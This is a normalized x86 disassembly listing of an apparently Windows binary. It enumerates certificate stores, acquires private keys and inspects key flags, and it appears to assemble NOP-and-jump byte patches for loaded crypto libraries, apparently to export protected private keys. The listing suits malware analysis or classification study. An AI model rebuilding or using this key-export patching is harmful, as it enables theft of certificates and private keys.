push eax
call sub_402d50
or eax 0x4
push 0x0
lea edx [ ebp - 0x48 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push r--data
push rw-data
mov [ ebp - 0x4 ] 0xa
call sub_409de0
add esp 0x8
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push ebx
push r--data
push rw-data
call sub_409de0
add esp 0x8
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ebp - 0x9c ]
push ebx
call sub_4014f0
add esp 0x4
test al al
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x34 ] 0x8
jb r-xdata
or edi [ ecx + 0xc ]
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov edx ebx
call sub_417360
lea edx [ ebp - 0x168 ]
push edx
call sub_403ab0
mov eax [ ebp - 0xb0 ]
push 0x2e
push ebx
push 0x5f
push eax
push 0x5f
lea ecx [ ebp + 0x24 ]
push ecx
push 0x5f
lea edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0x158 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_40a0a0
add esp 0x8
push eax
call sub_40e950
add esp 0x8
push eax
call sub_40a0a0
add esp 0x8
push eax
call sub_40e950
add esp 0x8
push eax
call sub_408170
push eax
call sub_40e950
add esp 0x8
push eax
call sub_40a0a0
add esp 0x8
push eax
call sub_40e950
mov eax 0x7
mov [ ebp - 0x7c ] eax
xor ecx ecx
mov [ ebp - 0x60 ] eax
xor edx edx
xor eax eax
mov [ ebp - 0x80 ] ecx
mov [ ebp - 0x90 ] dx
mov [ ebp - 0x64 ] ecx
mov [ ebp - 0x74 ] ax
mov eax [ ebp - 0x9c ]
lea ecx [ ebp - 0x90 ]
push ecx
mov [ ebp - 0x4 ] 0x3
call sub_401580
add esp 0xc
test al al
je r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
test ebx ebx
je r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push edi
call sub_402d50
or edi 0x4
cmp [ ebp + 0x40 ] 0x0
je r-xdata
lea edx [ ebp - 0x90 ]
push edx
push r--data
push rw-data
call sub_409de0
add esp 0x8
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ebx ebx
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
mov edx [ ebp - 0x9c ]
mov eax [ ebp - 0xa8 ]
push edx
push eax
call [ CertEnumCertificatesInStore@IAT ]
inc [ ebp - 0xb0 ]
mov [ ebp - 0x9c ] eax
test eax eax
jne r-xdata
cmp [ ebx + 0x14 ] 0x8
jb r-xdata
mov ebx 0x8
cmp [ ebp - 0x60 ] ebx
jb r-xdata
lea esi [ ebp - 0x2c ]
lea eax [ ebp - 0x168 ]
call sub_403b50
push 0x3
mov eax r--data
mov ecx esi
mov [ ebp - 0x4 ] 0x8
call sub_40ac40
sub esp 0x1c
mov edi esp
xor eax eax
mov [ ebp - 0xac ] esp
push eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] 0x0
mov ecx esi
mov [ edi ] ax
push ecx
or eax 0xffffffff
call sub_401be0
mov edi [ ebp - 0x9c ]
call sub_401800
mov bl al
add esp 0x1c
mov eax r--data
test bl bl
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x1c
call sub_438178
add esp 0x4
test eax eax
je r-xdata
xor ecx ecx
mov [ ebx + 0x14 ] 0x7
mov [ ebx + 0x10 ] 0x0
push ebx
mov [ ebx ] cx
call sub_43811c
add esp 0x4
mov eax [ ebx ]
push eax
call sub_43811c
add esp 0x4
xor esi esi
xor edx edx
mov edi 0x7
mov [ ebp - 0x60 ] edi
mov [ ebp - 0x64 ] esi
mov [ ebp - 0x74 ] dx
cmp [ ebp - 0x7c ] ebx
jb r-xdata
mov ecx [ ebp - 0x74 ]
push ecx
call sub_43811c
add esp 0x4
push eax
push r--data
lea edx [ ebp - 0x2c ]
push edx
push r--data
push rw-data
call sub_409de0
add esp 0x8
push eax
call sub_40a0a0
add esp 0x8
push eax
call sub_409de0
add esp 0x8
push eax
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax r--data
lea edx [ ebp - 0x74 ]
push edx
push r--data
push rw-data
call sub_409de0
add esp 0x8
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
xor ecx ecx
mov [ ebp - 0x90 ] cx
lea ecx [ ebp - 0x168 ]
mov [ ebp - 0x7c ] edi
mov [ ebp - 0x80 ] esi
mov [ ebp - 0x4 ] 0x1
call sub_403550
mov ebx [ ebp - 0xb8 ]
jmp r-xdata
mov eax [ ebp - 0x90 ]
push eax
call sub_43811c
add esp 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push ebx
push eax
call sub_402d50
or eax 0x4
test bl bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
lea edx [ ebp - 0xb4 ]
push edx
mov edx [ ebp - 0x9c ]
lea eax [ ebp - 0xbc ]
push eax
lea ecx [ ebp - 0xa0 ]
push ecx
push ebx
push 0x10000
push edx
mov [ ebp - 0xa0 ] ebx
mov [ ebp - 0xbc ] ebx
mov [ ebp - 0xb4 ] ebx
call [ CryptAcquireCertificatePrivateKey@IAT ]
test eax eax
je r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
push 0x0
lea edx [ ebp - 0x48 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x9
call sub_409de0
add esp 0x8
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
push ebx
lea eax [ ebp - 0x2c ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x7
call sub_409de0
add esp 0x8
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ebp - 0xbc ]
mov [ ebp - 0xac ] ebx
mov [ ebp - 0x91 ] bl
cmp eax 0xffffffff
jne r-xdata
push ebx
push eax
call sub_402d50
or eax 0x4
mov eax [ ebp - 0x2c ]
push eax
call sub_43811c
add esp 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
lea edx [ ebp - 0x98 ]
push edx
push eax
mov eax [ ebp - 0xa0 ]
xor esi esi
push eax
mov [ ebp - 0xa4 ] esi
mov [ ebp - 0x98 ] esi
call [ CryptGetUserKey@IAT ]
test eax eax
setne bl
test bl bl
je r-xdata
cmp [ rw-data ] bl
je r-xdata
cmp [ ebp - 0x34 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
cmp [ ebp - 0xb4 ] 0x0
je r-xdata
mov eax [ ebp - 0x98 ]
push esi
mov esi [ CryptGetKeyParam@IAT ]
lea ecx [ ebp - 0xa4 ]
push ecx
lea edx [ ebp - 0xac ]
push edx
push 0x9
mov edi 0x4
push eax
mov [ ebp - 0xa4 ] edi
call esi
push 0x0
lea ecx [ ebp - 0xa4 ]
push ecx
lea edx [ ebp - 0xc0 ]
push edx
test eax eax
mov eax [ ebp - 0x98 ]
push 0x6
push eax
setne bl
mov [ ebp - 0xa4 ] edi
call esi
mov edx [ ebp - 0xc0 ]
test eax eax
setne cl
shr edx 0x2
and bl cl
and dl 0x1
mov [ ebp - 0x91 ] dl
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov edx [ ebp - 0xa0 ]
push ebx
lea eax [ ebp - 0x98 ]
push eax
push 0x4
lea ecx [ ebp - 0xac ]
push ecx
push r--data
push edx
mov [ ebp - 0x98 ] ebx
call [ rw-data ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
test bl bl
je r-xdata
mov eax [ ebp - 0xa0 ]
push 0x0
push eax
call [ CryptReleaseContext@IAT ]
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
xor bl bl
cmp [ ebp - 0x98 ] 0x4
jne r-xdata
cmp [ ebp + 0x40 ] 0x0
je r-xdata
cmp [ ebp - 0x91 ] 0x0
mov eax r--data
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jmp r-xdata
mov edi 0x4
mov ecx [ ebp - 0xa0 ]
push ecx
call [ rw-data ]
jmp r-xdata
mov bl 0x1
jmp r-xdata
lea esi [ ebp - 0x2c ]
lea eax [ ebp - 0x168 ]
call sub_403b50
push 0x3
mov eax r--data
mov ecx esi
mov [ ebp - 0x4 ] 0x4
call sub_40ac40
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x98 ] esp
mov ebx 0x7
xor esi esi
xor edx edx
mov [ ecx + 0x14 ] ebx
mov [ ecx + 0x10 ] esi
push 0x8
mov eax r--data
mov [ ecx ] dx
call sub_401c90
sub esp 0x1c
mov edi esp
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0xa4 ] esp
xor eax eax
mov [ edi + 0x14 ] ebx
mov [ edi + 0x10 ] esi
push esi
lea ecx [ ebp - 0x2c ]
mov [ edi ] ax
push ecx
or eax 0xffffffff
call sub_401be0
mov ecx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x4
call sub_401680
mov bl al
add esp 0x38
mov eax r--data
test bl bl
jne r-xdata
push eax
push r--data
push rw-data
call sub_409de0
add esp 0x8
push eax
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax r--data
jne r-xdata
lea eax [ ebp - 0x91 ]
push eax
lea edx [ ebp - 0xa0 ]
call sub_4051e0
add esp 0x4
and bl al
cmp [ ebp - 0xb4 ] 0x0
je r-xdata
push eax
push r--data
lea edx [ ebp - 0x2c ]
push edx
push r--data
push rw-data
call sub_409de0
add esp 0x8
push eax
call sub_40a0a0
add esp 0x8
push eax
call sub_409de0
add esp 0x8
push eax
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax r--data
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ ebp - 0xac ]
push edx
push r--data
push rw-data
call sub_409de0
add esp 0x8
push eax
call sub_408170
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
test bl bl
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
push 0x0
lea edx [ ebp - 0x48 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x6
call sub_409de0
add esp 0x8
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
lea esi [ ebp - 0x48 ]
call sub_4218d0
jmp r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_416940
cmp [ esi + 0x30 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x30 ] 0x7
mov [ esi + 0x2c ] 0x0
mov [ esi + 0x1c ] cx
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov eax [ esi + 0x1c ]
push eax
call sub_43811c
add esp 0x4
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
retn
mov edx [ esi ]
push edx
call sub_43811c
add esp 0x4
sub_416990
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_45354d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1f8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1f0 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x208 ]
mov [ fs : 0x0 ] eax
push 0x11c
xor edi edi
lea eax [ esp + 0xc0 ]
push edi
push eax
mov [ esp + 0x1ec ] 0x10840f7
mov [ esp + 0x1f0 ] 0x7540
mov [ esp + 0x22 ] 0xeb
mov [ esp + 0x200 ] 0x10840f7
mov [ esp + 0x204 ] 0xf000040
mov [ esp + 0x208 ] 0x85
mov bl 0x90
mov [ esp + 0x28 ] 0xe990
mov [ esp + 0x24 ] 0xd75
mov [ esp + 0x23 ] 0xeb
mov [ esp + 0x1f4 ] 0x840f7
mov [ esp + 0x1f8 ] 0xf000040
mov [ esp + 0x1fc ] 0x85
mov [ esp + 0x2c ] 0xe990
call sub_43a820
add esp 0xc
lea ecx [ esp + 0xbc ]
push ecx
mov [ esp + 0xc0 ] 0x11c
call [ GetVersionExW@IAT ]
test eax eax
je r-xdata
push edi
lea ecx [ esp + 0xa4 ]
push 0x1
push ecx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
mov ebx 0x6
push rw-data
mov [ esp + 0x220 ] ebx
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
test [ eax + esi + 0xc ] bl
jne r-xdata
cmp [ esp + 0xc0 ] 0x5
push 0xa
seta bl
xor edx edx
mov eax r--data
lea ecx [ esp + 0x88 ]
mov [ esp + 0x9c ] 0x7
mov [ esp + 0x98 ] edi
mov [ esp + 0x88 ] dx
call sub_401c90
mov [ esp + 0x210 ] edi
cmp [ esp + 0x98 ] 0x8
mov eax [ esp + 0x84 ]
jae r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push eax
call [ GetModuleHandleW@IAT ]
mov esi eax
cmp esi edi
je r-xdata
lea eax [ esp + 0x84 ]
cmp [ esp + 0xb4 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
cmp [ esp + 0x98 ] 0x8
mov eax [ esp + 0x84 ]
jae r-xdata
cmp esi 0xffffffff
jne r-xdata
mov al 0x1
mov ecx [ esp + 0x208 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x1f0 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov edx [ esp + 0xa0 ]
push edx
push 0x0
push eax
call sub_402d50
or eax 0x4
push eax
call [ LoadLibraryW@IAT ]
mov esi eax
lea eax [ esp + 0x84 ]
cmp esi edi
je r-xdata
push edi
lea edx [ esp + 0xa4 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push ecx
lea eax [ esp + 0x94 ]
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x230 ] 0x5
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
test [ eax + esi + 0xc ] 0x6
jne r-xdata
cmp esi 0xffffffff
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax 0x7
xor ecx ecx
xor edx edx
mov [ esp + 0x60 ] eax
mov [ esp + 0x5c ] edi
mov [ esp + 0x4c ] cx
mov [ esp + 0x7c ] eax
mov [ esp + 0x78 ] edi
mov [ esp + 0x68 ] dx
push edi
lea eax [ esp + 0x88 ]
push eax
lea ecx [ esp + 0x34 ]
push ecx
mov [ esp + 0x21c ] 0x1
call sub_40b420
add esp 0xc
test al al
je r-xdata
cmp [ esp + 0xb4 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push edi
lea edx [ esp + 0xa4 ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x220 ] 0x4
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov edx [ esp + 0x44 ]
mov edi [ esp + 0x40 ]
push r--data
push esi
mov [ esp + 0x2c ] edx
call [ GetProcAddress@IAT ]
xor ecx ecx
cmp eax ecx
je r-xdata
cmp [ esp + 0x98 ] 0x8
jb r-xdata
mov edx [ esp + 0xa0 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
lea edx [ esp + 0x84 ]
push edx
push ecx
push r--data
push rw-data
call sub_404c10
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
cmp edi ecx
je r-xdata
mov eax [ esp + 0x84 ]
push eax
jmp r-xdata
lea esi [ esp + 0xa0 ]
call sub_4218d0
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov esi [ esp + 0x24 ]
cmp esi ecx
jbe r-xdata
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
lea esi [ esp + 0x2c ]
call sub_407c10
jmp r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov [ esp + 0x28 ] ecx
mov [ esp + 0x24 ] ecx
lea ecx [ esp + 0x1f4 ]
test bl bl
jne r-xdata
push 0x0
push eax
call sub_402d50
lea esi [ esp + 0x2c ]
call sub_407c10
jmp r-xdata
or eax 0x4
add esi edi
push 0xffffffff
movzx edi bl
lea edx [ esp + 0x2c ]
push edx
neg edi
sbb edi edi
push ecx
and edi 0x3
push esi
add edi 0x6
push eax
call sub_406610
add esp 0x14
test al al
je r-xdata
lea ecx [ esp + 0x1e0 ]
push 0x0
lea ecx [ esp + 0xa4 ]
push 0x1
push ecx
call sub_40e020
add esp 0xc
push eax
push ecx
mov [ esp + 0x218 ] 0x3
push r--data
jmp r-xdata
lea eax [ esp + 0x1e8 ]
test bl bl
jne r-xdata
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
call sub_408150
jmp r-xdata
mov edx [ esp + 0x28 ]
push 0xffffffff
movzx edi bl
lea ecx [ esp + 0x28 ]
push ecx
neg edi
sbb edi edi
push eax
inc edx
and edi 0x7
push esi
add edi 0x2
push edx
call sub_406610
add esp 0x14
test al al
je r-xdata
lea eax [ esp + 0x18 ]
push 0x0
lea eax [ esp + 0xa4 ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
mov [ esp + 0x218 ] 0x2
push r--data
test bl bl
je r-xdata
lea edi [ esp + 0x16 ]
mov eax 0x5
lea edi [ esp + 0x1c ]
mov eax 0x7
jmp r-xdata
mov eax r--data
test bl bl
je r-xdata
mov edx [ esp + 0x28 ]
xor ecx ecx
test bl bl
setne cl
push edi
lea edi [ eax + edx ]
or eax 0xffffffff
inc ecx
mov esi ecx
call sub_406560
add esp 0x4
test al al
je r-xdata
lea ecx [ esp + 0x17 ]
xor eax eax
lea ecx [ esp + 0x20 ]
mov eax 0x7
jmp r-xdata
xor edx edx
push eax
push ecx
test bl bl
setne dl
push r--data
push ecx
add edx 0x35
push edx
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_40e950
add esp 0xc
push eax
call sub_409de0
add esp 0xc
push eax
call sub_409de0
add esp 0x8
mov esi eax
call sub_408150
lea esi [ esp + 0x2c ]
call sub_407c10
jmp r-xdata
push ecx
mov ecx [ esp + 0x28 ]
lea edi [ eax + ecx ]
or eax 0xffffffff
call sub_406560
add esp 0x4
test al al
mov eax r--data
jne r-xdata
sub_417020
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_4534d0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x58 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x70 ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov [ esp + 0x34 ] 0xa75c085
mov [ esp + 0x38 ] 0x90029be
mov [ esp + 0x3c ] 0xe980
mov [ esp + 0x58 ] 0x90909090
mov [ esp + 0x5c ] 0x90909090
mov [ esp + 0x60 ] 0x90909090
mov [ esp + 0x64 ] 0x9090
mov [ esp + 0x50 ] 0xb8909090
mov [ esp + 0x54 ] 0x80090029
mov [ esp + 0x48 ] 0xf875ff53
mov [ esp + 0x4c ] 0xff53
mov [ esp + 0x4e ] 0x15
mov [ esp + 0x40 ] 0x90909090
mov [ esp + 0x44 ] 0x9090
cmp [ rw-data ] bl
je r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push ebx
push ebx
lea eax [ esp + 0x18 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push ebx
lea ecx [ esp + 0x1c ]
push 0x1
push ecx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ esp + 0x88 ] 0x3
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call [ rw-data ]
test eax eax
sete al
cmp al bl
je r-xdata
mov al 0x1
mov ecx [ esp + 0x70 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x58 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
lea ecx [ esp + 0x34 ]
lea esi [ ebx + 0x7 ]
cmp edx [ eax + 0x4 ]
jne r-xdata
push ebx
push eax
call sub_402d50
or eax 0x4
cmp [ esp + 0x2c ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
